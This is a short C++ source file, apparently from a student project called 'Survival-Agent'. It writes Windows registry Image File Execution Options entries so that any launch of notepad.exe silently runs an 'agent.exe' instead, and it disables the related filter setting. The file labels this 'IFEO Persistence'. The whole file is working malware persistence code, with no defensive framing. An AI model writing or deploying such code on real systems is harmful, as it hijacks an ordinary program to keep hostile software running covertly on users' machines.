#include <windows.h>
#include <iostream>

int main() {
    // 1. Set the Debugger to point to our agent
    const char* cmd1 = "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe\" /v Debugger /t REG_SZ /d \"C:\\Users\\abdul\\Downloads\\FYP\\Survival-Agent\\agent.exe\" /f";
    
    // 2. Disable the Filter (Requirement for modern Windows)
    const char* cmd2 = "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe\" /v UseFilter /t REG_DWORD /d 0 /f";

    std::cout << "[*] Deploying IFEO Persistence..." << std::endl;

    if (system(cmd1) == 0 && system(cmd2) == 0) {
        std::cout << "[SUCCESS] IFEO Injector active for notepad.exe" << std::endl;
        return 0;
    } else {
        std::cerr << "[FAILURE] Failed to modify Registry. Check Administrator privileges." << std::endl;
        return 1;
    }
}